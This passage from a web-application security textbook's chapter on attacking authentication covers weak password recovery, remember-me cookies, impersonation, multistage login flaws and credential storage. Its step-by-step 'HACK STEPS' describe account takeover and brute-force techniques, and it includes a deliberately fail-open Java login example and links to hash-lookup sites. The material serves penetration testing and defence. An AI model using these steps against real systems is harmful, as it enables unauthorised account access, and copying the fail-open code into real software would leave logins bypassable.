TIP If the password change form is accessible only by authenticated users 
and does not contain a username fi eld, it may still be possible to supply an 
arbitrary username. The form may store the username in a hidden fi eld, which 
can easily be modifi ed. If not, try supplying an additional parameter containing the username, using the same parameter name as is used in the main 
login form. This trick sometimes succeeds in overriding the username of the 
current user, enabling you to brute-force the credentials of other users even 
when this is not possible at the main login.
c06.indd 172 c06.indd 172 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 173
 Chapter 6 n Attacking Authentication 173
TRY IT!
http://mdsec.net/auth/104/
http://mdsec.net/auth/117/
http://mdsec.net/auth/120/
http://mdsec.net/auth/125/
http://mdsec.net/auth/129/
http://mdsec.net/auth/135/
Forgotten Password Functionality
Like password change functionality, mechanisms for recovering from a forgotten password situation often introduce problems that may have been avoided 
in the main login function, such as username enumeration.
In addition to this range of defects, design weaknesses in forgotten password functions frequently make this the weakest link at which to attack the 
application‚Äôs overall authentication logic. Several kinds of design weaknesses 
can often be found:
n Forgotten password functionality often involves presenting the user with 
a secondary challenge in place of the main login, as shown in Figure 6-5. 
This challenge is often much easier for an attacker to respond to than 
attempting to guess the user‚Äôs password. Questions about mothers‚Äô maiden 
names, memorable dates, favorite colors, and the like generally will have a 
much smaller set of potential answers than the set of possible passwords. 
Furthermore, they often concern information that is publicly known or 
that a determined attacker can discover with a modest degree of effort.
Figure 6-5: A secondary challenge used in an account 
recovery function
In many cases, the application allows users to set their own password 
recovery challenge and response during registration. Users are inclined 
c06.indd 173 c06.indd 173 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 174
174 Chapter 6 n Attacking Authentication
to set extremely insecure challenges, presumably on the false assumption 
that only they will ever be presented with them. An example is ‚ÄúDo I own 
a boat?‚Äù In this situation, an attacker who wants to gain access can use 
an automated attack to iterate through a list of enumerated or common 
usernames, log all the password recovery challenges, and select those that 
appear most easily guessable. (See Chapter 14 for techniques regarding 
how to grab this kind of data in a scripted attack.)
n As with password change functionality, application developers commonly 
overlook the possibility of brute-forcing the response to a password recovery challenge, even when they block this attack on the main login page. If 
an application allows unrestricted attempts to answer password recovery 
challenges, it is highly likely to be compromised by a determined attacker.
n In some applications, the recovery challenge is replaced with a simple 
password ‚Äúhint‚Äù that is confi gured by users during registration. Users 
commonly set extremely obvious hints, perhaps even one that is identical to the password itself, on the false assumption that only they will 
ever see them. Again, an attacker with a list of common or enumerated 
usernames can easily capture a large number of password hints and then 
start guessing.
n The mechanism by which an application enables users to regain control of 
their account after correctly responding to a challenge is often vulnerable. 
One reasonably secure means of implementing this is to send a unique, 
unguessable, time-limited recovery URL to the e-mail address that the 
user provided during registration. Visiting this URL within a few minutes 
enables the user to set a new password. However, other mechanisms for 
account recovery are often encountered that are insecure by design:
n Some applications disclose the existing, forgotten password to the user 
after successful completion of a challenge, enabling an attacker to use 
the account indefi nitely without any risk of detection by the owner. 
Even if the account owner subsequently changes the blown password, 
the attacker can simply repeat the same challenge to obtain the new 
password.
n Some applications immediately drop the user into an authenticated 
session after successful completion of a challenge, again enabling an 
attacker to use the account indefi nitely without detection, and without 
ever needing to know the user‚Äôs password.
n Some applications employ the mechanism of sending a unique recovery URL but send this to an e-mail address specifi ed by the user at the 
time the challenge is completed. This provides absolutely no enhanced 
security for the recovery process beyond possibly logging the e-mail 
address used by an attacker.
c06.indd 174 c06.indd 174 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 175
 Chapter 6 n Attacking Authentication 175
TIP Even if the application does not provide an on-screen fi eld for you to provide an e-mail address to receive the recovery URL, the application may transmit 
the address via a hidden form fi eld or cookie. This presents a double opportunity: 
you can discover the e-mail address of the user you have compromised, and you 
can modify its value to receive the recovery URL at an address of your choosing.
n Some applications allow users to reset their password‚Äôs value directly 
after successful completion of a challenge and do not send any e-mail 
notifi cation to the user. This means that the compromising of an account 
by an attacker will not be noticed until the owner attempts to log in 
again. It may even remain unnoticed if the owner assumes that she 
must have forgotten her password and therefore resets it in the same 
way. An attacker who simply desires some access to the application can 
then compromise a different user‚Äôs account for a period of time and 
therefore can continue using the application indefi nitely.
HACK STEPS
 1. Identify any forgotten password functionality within the application. If 
this is not explicitly linked from published content, it may still be implemented (see Chapter 4).
 2. Understand how the forgotten password function works by doing a 
complete walk-through using an account you control.
 3. If the mechanism uses a challenge, determine whether users can set or 
select their own challenge and response. If so, use a list of enumerated or 
common usernames to harvest a list of challenges, and review this for any 
that appear easily guessable.
 4. If the mechanism uses a password ‚Äúhint,‚Äù do the same exercise to harvest 
a list of password hints, and target any that are easily guessable.
 5. Try to identify any behavior in the forgotten password mechanism that 
can be exploited as the basis for username enumeration or brute-force 
attacks (see the previous details).
 6. If the application generates an e-mail containing a recovery URL in 
response to a forgotten password request, obtain a number of these URLs, 
and attempt to identify any patterns that may enable you to predict the 
URLs issued to other users. Employ the same techniques as are relevant to 
analyzing session tokens for predictability (see Chapter 7).
TRY IT!
http://mdsec.net/auth/142/
http://mdsec.net/auth/145/
http://mdsec.net/auth/151/
c06.indd 175 c06.indd 175 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 176
176 Chapter 6 n Attacking Authentication
‚ÄúRemember Me‚Äù Functionality
Applications often implement ‚Äúremember me‚Äù functions as a convenience to 
users. This way, users don‚Äôt need to reenter their username and password each 
time they use the application from a specifi c computer. These functions are 
often insecure by design and leave the user exposed to attack both locally and 
by users on other computers:
n Some ‚Äúremember me‚Äù functions are implemented using a simple persistent cookie, such as RememberUser=daf (see Figure 6-6). When this 
cookie is submitted to the initial application page, the application trusts 
the cookie to authenticate the user, and it creates an application session 
for that person, bypassing the login. An attacker can use a list of common 
or enumerated usernames to gain full access to the application without 
any authentication.
Figure 6-6: A vulnerable ‚Äúremember me‚Äù function, which automatically logs in a 
user based solely on a username stored in a cookie
c06.indd 176 c06.indd 176 8/19/2011 12:06:39 PM 8/19/2011 12:06:39 PM
Stuttard c06.indd V3 - 07/22/2011 Page 177
 Chapter 6 n Attacking Authentication 177
n Some ‚Äúremember me‚Äù functions set a cookie that contains not the username 
but a kind of persistent session identifi er, such as RememberUser=1328.
When the identifi er is submitted to the login page, the application looks 
up the user associated with it and creates an application session for 
that user. As with ordinary session tokens, if the session identifi ers of 
other users can be predicted or extrapolated, an attacker can iterate 
through a large number of potential identifi ers to fi nd those associated with application users, and therefore gain access to their accounts 
without authentication. See Chapter 7 for techniques for performing 
this attack.
n Even if the information stored for reidentifying users is suitably protected 
(encrypted) to prevent other users from determining or guessing it, the 
information may still be vulnerable to capture through a bug such as 
cross-site scripting (see Chapter 12), or by an attacker who has local access 
to the user‚Äôs computer.
HACK STEPS
 1. Activate any ‚Äúremember me‚Äù functionality, and determine whether the 
functionality indeed does fully ‚Äúremember‚Äù the user or whether it remembers only his username and still requires him to enter a password on subsequent visits. If the latter is the case, the functionality is much less likely 
to expose any security flaw.
 2. Closely inspect all persistent cookies that are set, and also any data that 
is persisted in other local storage mechanisms, such as Internet Explorer‚Äôs 
userData, Silverlight isolated storage, or Flash local shared objects. Look 
for any saved data that identifies the user explicitly or appears to contain 
some predictable identifier of the user.
 3. Even where stored data appears to be heavily encoded or obfuscated, 
review this closely. Compare the results of ‚Äúremembering‚Äù several very 
similar usernames and/or passwords to identify any opportunities to 
reverse-engineer the original data. Here, use the same techniques that 
are described in Chapter 7 to detect meaning and patterns in session 
tokens.
 4. Attempt to modify the contents of the persistent cookie to try to convince the application that another user has saved his details on your 
computer.
c06.indd 177 c06.indd 177 8/19/2011 12:06:39 PM 8/19/2011 12:06:39 PM
Stuttard c06.indd V3 - 07/22/2011 Page 178
178 Chapter 6 n Attacking Authentication
TRY IT!
http://mdsec.net/auth/219/
http://mdsec.net/auth/224/
http://mdsec.net/auth/227/
http://mdsec.net/auth/229/
http://mdsec.net/auth/232/
http://mdsec.net/auth/236/
http://mdsec.net/auth/239/
http://mdsec.net/auth/245/
User Impersonation Functionality
Some applications implement the facility for a privileged user of the application 
to impersonate other users in order to access data and carry out actions within 
their user context. For example, some banking applications allow helpdesk operators to verbally authenticate a telephone user and then switch their application 
session into that user‚Äôs context to assist him or her.
Various design fl aws commonly exist within impersonation functionality:
n It may be implemented as a ‚Äúhidden‚Äù function, which is not subject to 
proper access controls. For example, anyone who knows or guesses the 
URL /admin/ImpersonateUser.jsp may be able to make use of the function and impersonate any other user (see Chapter 8).
n The application may trust user-controllable data when determining whether 
the user is performing impersonation. For example, in addition to a valid 
session token, a user may submit a cookie specifying which account his 
session is currently using. An attacker may be able to modify this value 
and gain access to other user accounts without authentication, as shown 
in Figure 6-7.
n If an application allows administrative users to be impersonated, any weakness in the impersonation logic may result in a vertical privilege escalation 
vulnerability. Rather than simply gaining access to other ordinary users‚Äô 
data, an attacker may gain full control of the application.
n Some impersonation functionality is implemented as a simple ‚Äúbackdoor‚Äù 
password that can be submitted to the standard login page along with any 
username to authenticate as that user. This design is highly insecure for 
many reasons, but the biggest opportunity for attackers is that they are 
likely to discover this password when performing standard attacks such 
as brute-forcing of the login. If the backdoor password is matched before 
the user‚Äôs actual password, the attacker is likely to discover the function of 
c06.indd 178 c06.indd 178 8/19/2011 12:06:39 PM 8/19/2011 12:06:39 PM
Stuttard c06.indd V3 - 07/22/2011 Page 179
 Chapter 6 n Attacking Authentication 179
the backdoor password and therefore gain access to every user‚Äôs account. 
Similarly, a brute-force attack might result in two different ‚Äúhits,‚Äù thereby 
revealing the backdoor password, as shown in Figure 6-8.
Figure 6-7: A vulnerable user impersonation function
HACK STEPS
 1. Identify any impersonation functionality within the application. If this is 
not explicitly linked from published content, it may still be implemented 
(see Chapter 4).
 2. Attempt to use the impersonation functionality directly to impersonate 
other users.
 3. Attempt to manipulate any user-supplied data that is processed by the 
impersonation function in an attempt to impersonate other users. Pay 
particular attention to any cases where your username is being submitted 
other than during normal login.
 4. If you succeed in making use of the functionality, attempt to impersonate 
any known or guessed administrative users to elevate privileges.
 5. When carrying out password-guessing attacks (see the ‚ÄúBrute-Forcible 
Login‚Äù section), review whether any users appear to have more than one 
valid password, or whether a specific password has been matched against 
several usernames. Also, log in as many different users with the credentials 
captured in a brute-force attack, and review whether everything appears 
normal. Pay close attention to any ‚Äúlogged in as X‚Äù status message.
c06.indd 179 c06.indd 179 8/19/2011 12:06:39 PM 8/19/2011 12:06:39 PM
Stuttard c06.indd V3 - 07/22/2011 Page 180
180 Chapter 6 n Attacking Authentication
TRY IT!
http://mdsec.net/auth/272/
http://mdsec.net/auth/290/
Figure 6-8: A password-guessing attack with two ‚Äúhits,‚Äù indicating the 
presence of a backdoor password
Incomplete Validation of Credentials
Well-designed authentication mechanisms enforce various requirements on 
passwords, such as a minimum length or the presence of both uppercase and 
lowercase characters. Correspondingly, some poorly designed authentication 
mechanisms not only do not enforce these good practices but also do not take 
into account users‚Äô own attempts to comply with them.
For example, some applications truncate passwords and therefore validate 
only the fi rst n characters. Some applications perform a case-insensitive check 
of passwords. Some applications strip unusual characters (sometimes on the 
pretext of performing input validation) before checking passwords. In recent 
times, behavior of this kind has been identifi ed in some surprisingly high-profi le 
web applications, usually as a result of trial and error by curious users.
c06.indd 180 c06.indd 180 8/19/2011 12:06:39 PM 8/19/2011 12:06:39 PM
Stuttard c06.indd V3 - 07/22/2011 Page 181
 Chapter 6 n Attacking Authentication 181
Each of these limitations on password validation reduces by an order of 
magnitude the number of variations available in the set of possible passwords. 
Through experimentation, you can determine whether a password is being 
fully validated or whether any limitations are in effect. You can then fi ne-tune 
your automated attacks against the login to remove unnecessary test cases, 
thereby massively reducing the number of requests necessary to compromise 
user accounts.
HACK STEPS
 1. Using an account you control, attempt to log in with variations on your 
own password: removing the last character, changing the case of a character, and removing any special typographical characters. If any of these 
attempts is successful, continue experimenting to try to understand what 
validation is actually occurring.
 2. Feed any results back into your automated password-guessing attacks to 
remove superfluous test cases and improve the chances of success.
TRY IT!
http://mdsec.net/auth/293/
Nonunique Usernames
Some applications that support self-registration allow users to specify their 
own username and do not enforce a requirement that usernames be unique. 
Although this is rare, the authors have encountered more than one application 
with this behavior.
This represents a design fl aw for two reasons:
n One user who shares a username with another user may also happen to 
select the same password as that user, either during registration or in a 
subsequent password change. In this eventuality, the application either 
rejects the second user‚Äôs chosen password or allows two accounts to 
have identical credentials. In the fi rst instance, the application‚Äôs behavior 
effectively discloses to one user the credentials of the other user. In the 
second instance, subsequent logins by one of the users result in access to 
the other user‚Äôs account.
n An attacker may exploit this behavior to carry out a successful brute-force 
attack, even though this may not be possible elsewhere due to restrictions 
on failed login attempts. An attacker can register a specifi c username 
c06.indd 181 c06.indd 181 8/19/2011 12:06:39 PM 8/19/2011 12:06:39 PM
Stuttard c06.indd V3 - 07/22/2011 Page 182
182 Chapter 6 n Attacking Authentication
multiple times with different passwords while monitoring for the differential response that indicates that an account with that username 
and password already exists. The attacker will have ascertained a target 
user‚Äôs password without making a single attempt to log in as that user.
Badly designed self-registration functionality can also provide a means for 
username enumeration. If an application disallows duplicate usernames, an 
attacker may attempt to register large numbers of common usernames to identify the existing usernames that are rejected.
HACK STEPS
 1. If self-registration is possible, attempt to register the same username 
twice with different passwords.
 2. If the application blocks the second registration attempt, you can exploit 
this behavior to enumerate existing usernames even if this is not possible 
on the main login page or elsewhere. Make multiple registration attempts 
with a list of common usernames to identify the already registered names 
that the application blocks.
 3. If the registration of duplicate usernames succeeds, attempt to register 
the same username twice with the same password, and determine the 
application‚Äôs behavior:
 a. If an error message results, you can exploit this behavior to carry out a 
brute-force attack, even if this is not possible on the main login page. 
Target an enumerated or guessed username, and attempt to register 
this username multiple times with a list of common passwords. When 
the application rejects a specific password, you have probably found 
the existing password for the targeted account.
 b. If no error message results, log in using the credentials you specified, and see what happens. You may need to register several users, 
and modify different data held within each account, to understand 
whether this behavior can be used to gain unauthorized access to 
other users‚Äô accounts.
Predictable Usernames
Some applications automatically generate account usernames according to 
a predictable sequence (cust5331, cust5332, and so on). When an application 
behaves like this, an attacker who can discern the sequence can quickly arrive 
at a potentially exhaustive list of all valid usernames, which can be used as 
the basis for further attacks. Unlike enumeration methods that rely on making 
repeated requests driven by wordlists, this means of determining usernames 
can be carried out nonintrusively with minimal interaction with the application.
c06.indd 182 c06.indd 182 8/19/2011 12:06:40 PM 8/19/2011 12:06:40 PM
Stuttard c06.indd V3 - 07/22/2011 Page 183
 Chapter 6 n Attacking Authentication 183
HACK STEPS
 1. If the application generates usernames, try to obtain several in quick 
succession, and determine whether any sequence or pattern can be 
discerned.
 2. If it can, extrapolate backwards to obtain a list of possible valid usernames. This can be used as the basis for a brute-force attack against the 
login and other attacks where valid usernames are required, such as the 
exploitation of access control flaws (see Chapter 8).
TRY IT!
http://mdsec.net/auth/169/
Predictable Initial Passwords
In some applications, users are created all at once or in sizeable batches and are 
automatically assigned initial passwords, which are then distributed to them 
through some means. The means of generating passwords may enable an attacker 
to predict the passwords of other application users. This kind of vulnerability is 
more common on intranet-based corporate applications ‚Äî for example, where 
every employee has an account created on her behalf and receives a printed 
notifi cation of her password.
In the most vulnerable cases, all users receive the same password, or one 
closely derived from their username or job function. In other cases, generated 
passwords may contain sequences that could be identifi ed or guessed with 
access to a very small sample of initial passwords.
HACK STEPS
 1. If the application generates passwords, try to obtain several in quick 
succession, and determine whether any sequence or pattern can be 
discerned.
 2. If it can, extrapolate the pattern to obtain a list of passwords for other 
application users.
 3. If passwords demonstrate a pattern that can be correlated with usernames, you can try to log in using known or guessed usernames and the 
corresponding inferred passwords.
 4. Otherwise, you can use the list of inferred passwords as the basis for a 
brute-force attack with a list of enumerated or common usernames.
c06.indd 183 c06.indd 183 8/19/2011 12:06:40 PM 8/19/2011 12:06:40 PM
Stuttard c06.indd V3 - 07/22/2011 Page 184
184 Chapter 6 n Attacking Authentication
TRY IT!
http://mdsec.net/auth/172/
Insecure Distribution of Credentials
Many applications employ a process in which credentials for newly created accounts 
are distributed to users out-of-band of their normal interaction with the application (for example, via post, e-mail, or SMS text message). Sometimes, this is done 
for reasons motivated by security concerns, such as to provide assurance that 
the postal or e-mail address supplied by the user actually belongs to that person.
In some cases, this process can present a security risk. For example, suppose 
that the message distributed contains both username and password, there is 
no time limit on their use, and there is no requirement for the user to change 
the password on fi rst login. It is highly likely that a large number, even the 
majority, of application users will not modify their initial credentials and that 
the distribution messages will remain in existence for a lengthy period, during 
which they may be accessed by an unauthorized party.
Sometimes, what is distributed is not the credentials themselves, but rather 
an ‚Äúaccount activation‚Äù URL, which enables users to set their own initial password. If the series of these URLs sent to successive users manifests any kind of 
sequence, an attacker can identify this by registering multiple users in close succession and then infer the activation URLs sent to recent and forthcoming users.
A related behavior by some web applications is to allow new users to register 
accounts in a seemingly secure manner and then to send a welcome e-mail to 
each new user containing his full login credentials. In the worst case, a securityconscious user who decides to immediately change his possibly compromised 
password then receives another e-mail containing the new password ‚Äúfor future 
reference.‚Äù This behavior is so bizarre and unnecessary that users would be 
well advised to stop using web applications that indulge in it.
HACK STEPS
 1. Obtain a new account. If you are not required to set all credentials during 
registration, determine the means by which the application distributes 
credentials to new users.
 2. If an account activation URL is used, try to register several new accounts 
in close succession, and identify any sequence in the URLs you receive. 
If a pattern can be determined, try to predict the activation URLs sent to 
recent and forthcoming users, and attempt to use these URLs to take ownership of their accounts.
 3. Try to reuse a single activation URL multiple times, and see if the application allows this. If not, try locking out the target account before reusing 
the URL, and see if it now works.
c06.indd 184 c06.indd 184 8/19/2011 12:06:40 PM 8/19/2011 12:06:40 PM
Stuttard c06.indd V3 - 07/22/2011 Page 185
 Chapter 6 n Attacking Authentication 185
Implementation Flaws in Authentication
Even a well-designed authentication mechanism may be highly insecure due to 
mistakes made in its implementation. These mistakes may lead to information 
leakage, complete login bypassing, or a weakening of the overall security of 
the mechanism as designed. Implementation fl aws tend to be more subtle and 
harder to detect than design defects such as poor-quality passwords and bruteforcibility. For this reason, they are often a fruitful target for attacks against 
the most security-critical applications, where numerous threat models and 
penetration tests are likely to have claimed any low-hanging fruit. The authors 
have identifi ed each of the implementation fl aws described here within the web 
applications deployed by large banks.
Fail-Open Login Mechanisms
Fail-open logic is a species of logic fl aw (described in detail in Chapter 11) that has 
particularly serious consequences in the context of authentication mechanisms.
The following is a fairly contrived example of a login mechanism that fails 
open. If the call to db.getUser() throws an exception for some reason (for 
example, a null pointer exception arising because the user‚Äôs request did not 
contain a username or password parameter), the login succeeds. Although the 
resulting session may not be bound to a particular user identity and therefore 
may not be fully functional, this may still enable an attacker to access some 
sensitive data or functionality.
public Response checkLogin(Session session) {
 try {
 String uname = session.getParameter(‚Äúusername‚Äù);
 String passwd = session.getParameter(‚Äúpassword‚Äù);
 User user = db.getUser(uname, passwd);
 if (user == null) {
 // invalid credentials
 session.setMessage(‚ÄúLogin failed. ‚Äú);
 return doLogin(session);
 }
 }
 catch (Exception e) {}
 // valid user
 session.setMessage(‚ÄúLogin successful. ‚Äú);
 return doMainMenu(session);
}
In the fi eld, you would not expect code like this to pass even the most cursory 
security review. However, the same conceptual fl aw is much more likely to exist 
in more complex mechanisms in which numerous layered method invocations 
c06.indd 185 c06.indd 185 8/19/2011 12:06:40 PM 8/19/2011 12:06:40 PM
Stuttard c06.indd V3 - 07/22/2011 Page 186
186 Chapter 6 n Attacking Authentication
are made, in which many potential errors may arise and be handled in different 
places, and where the more complicated validation logic may involve maintaining signifi cant state about the login‚Äôs progress.
HACK STEPS
 1. Perform a complete, valid login using an account you control. Record 
every piece of data submitted to the application, and every response 
received, using your intercepting proxy.
 2. Repeat the login process numerous times, modifying pieces of the data 
submitted in unexpected ways. For example, for each request parameter 
or cookie sent by the client, do the following:
 a. Submit an empty string as the value.
 b. Remove the name/value pair altogether.
 c. Submit very long and very short values.
 d. Submit strings instead of numbers and vice versa.
 e. Submit the same item multiple times, with the same and different 
values.
 3. For each malformed request submitted, review closely the application‚Äôs 
response to identify any divergences from the base case.
 4. Feed these observations back into framing your test cases. When one 
modification causes a change in behavior, try to combine this with other 
changes to push the application‚Äôs logic to its limits.
TRY IT!
http://mdsec.net/auth/300/
Defects in Multistage Login Mechanisms
Some applications use elaborate login mechanisms involving multiple stages, 
such as the following:
n Entry of a username and password
n A challenge for specifi c digits from a PIN or a memorable word
n The submission of a value displayed on a changing physical token
Multistage login mechanisms are designed to provide enhanced security over 
the simple model based on username and password. Typically, the fi rst stage 
requires the users to identify themselves with a username or similar item, and 
subsequent stages perform various authentication checks. Such mechanisms 
c06.indd 186 c06.indd 186 8/19/2011 12:06:40 PM 8/19/2011 12:06:40 PM
Stuttard c06.indd V3 - 07/22/2011 Page 187
 Chapter 6 n Attacking Authentication 187
frequently contain security vulnerabilities ‚Äî in particular, various logic fl aws 
(see Chapter 11).
COMMON MYTH
It is often assumed that multistage login mechanisms are less prone to security bypasses than standard username/password authentication. This belief 
is mistaken. Performing several authentication checks may add considerable 
security to the mechanism. But counterbalancing this, the process is more 
prone to fl aws in implementation. In several cases where a combination of 
fl aws is present, it can even result in a solution that is less secure than a normal login based on username and password.
Some implementations of multistage login mechanisms make potentially 
unsafe assumptions at each stage about the user‚Äôs interaction with earlier stages:
n An application may assume that a user who accesses stage three must 
have cleared stages one and two. Therefore, it may authenticate an attacker 
who proceeds directly from stage one to stage three and correctly completes it, enabling an attacker to log in with only one part of the various 
credentials normally required.
n An application may trust some of the data being processed at stage two 
because this was validated at stage one. However, an attacker may be able 
to manipulate this data at stage two, giving it a different value than was 
validated at stage one. For example, at stage one the application might 
determine whether the user‚Äôs account has expired, is locked out, or is in 
the administrative group, or whether it needs to complete further stages 
of the login beyond stage two. If an attacker can interfere with these 
fl ags as the login transitions between different stages, he may be able to 
modify the application‚Äôs behavior and cause it to authenticate him with 
only partial credentials or otherwise elevate privileges.
n An application may assume that the same user identity is used to complete 
each stage; however, it might not explicitly check this. For example, stage 
one might involve submitting a valid username and password, and stage 
two might involve resubmitting the username (now in a hidden form 
fi eld) and a value from a changing physical token. If an attacker submits 
valid data pairs at each stage, but for different users, the application might 
authenticate the user as either one of the identities used in the two stages. 
This would enable an attacker who possesses his own physical token and 
discovers another user‚Äôs password to log in as that user (or vice versa). 
Although the login mechanism cannot be completely compromised without any prior information, its overall security posture is substantially 
weakened, and the substantial expense and effort of implementing the 
two-factor mechanism do not deliver the benefi ts expected.
c06.indd 187 c06.indd 187 8/19/2011 12:06:40 PM 8/19/2011 12:06:40 PM
Stuttard c06.indd V3 - 07/22/2011 Page 188
188 Chapter 6 n Attacking Authentication
HACK STEPS
 1. Perform a complete, valid login using an account you control. Record every 
piece of data submitted to the application using your intercepting proxy.
 2. Identify each distinct stage of the login and the data that is collected at 
each stage. Determine whether any single piece of information is collected 
more than once or is ever transmitted back to the client and resubmitted 
via a hidden form field, cookie, or preset URL parameter (see Chapter 5).
 3. Repeat the login process numerous times with various malformed 
requests:
 a. Try performing the login steps in a different sequence.
 b. Try proceeding directly to any given stage and continuing from there.
 c. Try skipping each stage and continuing with the next.
 d. Use your imagination to think of other ways to access the different 
stages that the developers may not have anticipated.
 4. If any data is submitted more than once, try submitting a different value 
at different stages, and see whether the login is still successful. It may 
be that some of the submissions are superfluous and are not actually 
processed by the application. It might be that the data is validated at one 
stage and then trusted subsequently. In this instance, try to provide the 
credentials of one user at one stage, and then switch at the next to actually authenticate as a different user. It might be that the same piece of 
data is validated at more than one stage, but against different checks. In 
this instance, try to provide (for example) the username and password of 
one user at the first stage, and the username and PIN of a different user 
at the second stage.
 5. Pay close attention to any data being transmitted via the client that was 
not directly entered by the user. The application may use this data to store 
information about the state of the login progress, and the application may 
trust it when it is submitted back to the server. For example, if the request 
for stage three includes the parameter stage2complete=true, it may 
be possible to advance straight to stage three by setting this value. Try to 
modify the values being submitted, and determine whether this enables 
you to advance or skip stages.
TRY IT!
http://mdsec.net/auth/195/
http://mdsec.net/auth/199/
http://mdsec.net/auth/203/
http://mdsec.net/auth/206/
http://mdsec.net/auth/211/
c06.indd 188 c06.indd 188 8/19/2011 12:06:40 PM 8/19/2011 12:06:40 PM
Stuttard c06.indd V3 - 07/22/2011 Page 189
 Chapter 6 n Attacking Authentication 189
Some login mechanisms employ a randomly varying question at one of the stages 
of the login process. For example, after submitting a username and password, users 
might be asked one of various ‚Äúsecret‚Äù questions (regarding their mother‚Äôs maiden 
name, place of birth, name of fi rst school) or to submit two random letters from a 
secret phrase. The rationale for this behavior is that even if an attacker captures 
everything that a user enters on a single occasion, this will not enable him to log 
in as that user on a different occasion, because different questions will be asked.
In some implementations, this functionality is broken and does not achieve 
its objectives:
n The application may present a randomly chosen question and store the 
details within a hidden HTML form fi eld or cookie, rather than on the 
server. The user subsequently submits both the answer and the question 
itself. This effectively allows an attacker to choose which question to 
answer, enabling the attacker to repeat a login after capturing a user‚Äôs 
input on a single occasion.
n The application may present a randomly chosen question on each login 
attempt but not remember which question a given user was asked if he 
or she fails to submit an answer. If the same user initiates a fresh login 
attempt a moment later, a different random question is generated. This 
effectively allows an attacker to cycle through questions until he receives 
one to which he knows the answer, enabling him to repeat a login having 
captured a user‚Äôs input on a single occasion.
NOTE The second of these conditions is really quite subtle, and as a result, 
many real-world applications are vulnerable. An application that challenges a 
user for two random letters of a memorable word may appear at fi rst glance 
to be functioning properly and providing enhanced security. However, if the 
letters are randomly chosen each time the previous authentication stage is 
passed, an attacker who has captured a user‚Äôs login on a single occasion can 
simply reauthenticate up to this point until the two letters that he knows are 
requested, without the risk of account lockout.
HACK STEPS
 1. If one of the login stages uses a randomly varying question, verify whether 
the details of the question are being submitted together with the answer. 
If so, change the question, submit the correct answer associated with that 
question, and verify whether the login is still successful.
 2. If the application does not enable an attacker to submit an arbitrary 
question and answer, perform a partial login several times with a single 
account, proceeding each time as far as the varying question. If the question changes on each occasion, an attacker can still effectively choose 
which question to answer.
c06.indd 189 c06.indd 189 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 190
190 Chapter 6 n Attacking Authentication
TRY IT!
http://mdsec.net/auth/178/
http://mdsec.net/auth/182/
NOTE In some applications where one component of the login varies randomly, the application collects all of a user‚Äôs credentials at a single stage. 
For example, the main login page may present a form containing fi elds for 
username, password, and one of various secret questions. Each time the 
login page is loaded, the secret question changes. In this situation, the randomness of the secret question does nothing to prevent an attacker from 
replaying a valid login request having captured a user‚Äôs input on one occasion. The login process cannot be modifi ed to do so in its present form, 
because an attacker can simply reload the page until he receives the varying 
question to which he knows the answer. In a variation on this scenario, the 
application may set a persistent cookie to ‚Äúensure‚Äù that the same varying 
question is presented to any given user until that person answers it correctly. Of course, this measure can be circumvented easily by modifying or 
deleting the cookie.
Insecure Storage of Credentials
If an application stores login credentials insecurely, the security of the login 
mechanism is undermined, even though there may be no inherent fl aw in the 
authentication process itself.
It is common to encounter web applications in which user credentials are 
stored insecurely within the database. This may involve passwords being 
stored in cleartext. But if passwords are being hashed using a standard algorithm such as MD5 or SHA-1, this still allows an attacker to simply look up 
observed hashes against a precomputed database of hash values. Because the 
database account used by the application must have full read/write access to 
those credentials, many other kinds of vulnerabilities within the application 
may be exploitable to enable you to access these credentials, such as command 
or SQL injection fl aws (see Chapter 9) and access control weaknesses (see 
Chapter 8).
TIP Some online databases of common hashing functions are available here:
http://passcracking.com/index.php
http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/
script-hash-md5.php
c06.indd 190 c06.indd 190 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 191
 Chapter 6 n Attacking Authentication 191
HACK STEPS
 1. Review all of the application‚Äôs authentication-related functionality, as well 
as any functions relating to user maintenance. If you find any instances in 
which a user‚Äôs password is transmitted back to the client, this indicates 
that passwords are being stored insecurely, either in cleartext or using 
reversible encryption.
 2. If any kind of arbitrary command or query execution vulnerability is 
identified within the application, attempt to find the location within the 
application‚Äôs database or filesystem where user credentials are stored:
 a. Query these to determine whether passwords are being stored in 
unencrypted form.
 b. If passwords are stored in hashed form, check for nonunique values, indicating that an account has a common or default password 
assigned, and that the hashes are not being salted.
 c. If the password is hashed with a standard algorithm in unsalted form, 
query online hash databases to determine the corresponding cleartext 
password value.
Securing Authentication
Implementing a secure authentication solution involves attempting to simultaneously meet several key security objectives, and in many cases trade off against 
other objectives such as functionality, usability, and total cost. In some cases 
‚Äúmore‚Äù security can actually be counterproductive. For example, forcing users 
to set very long passwords and change them frequently often causes users to 
write down their passwords.
Because of the enormous variety of possible authentication vulnerabilities, 
and the potentially complex defenses that an application may need to deploy to 
mitigate against all of them, many application designers and developers choose 
to accept certain threats as a given and concentrate on preventing the most serious attacks. Here are some factors to consider in striking an appropriate balance:
n The criticality of security given the functionality that the application offers
n The degree to which users will tolerate and work with different types of 
authentication controls
n The cost of supporting a less user-friendly system
n The fi nancial cost of competing alternatives in relation to the revenue likely 
to be generated by the application or the value of the assets it protects
c06.indd 191 c06.indd 191 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 192
192 Chapter 6 n Attacking Authentication
This section describes the most effective ways to defeat the various attacks 
against authentication mechanisms. We‚Äôll leave it to you to decide which kinds 
of defenses are most appropriate in each case.
Use Strong Credentials
n Suitable minimum password quality requirements should be enforced. 
These may include rules regarding minimum length; the appearance of 
alphabetic, numeric, and typographic characters; the appearance of both 
uppercase and lowercase characters; the avoidance of dictionary words, 
names, and other common passwords; preventing a password from being 
set to the username; and preventing a similarity or match with previously set passwords. As with most security measures, different password 
quality requirements may be appropriate for different categories of user.
n Usernames should be unique.
n Any system-generated usernames and passwords should be created 
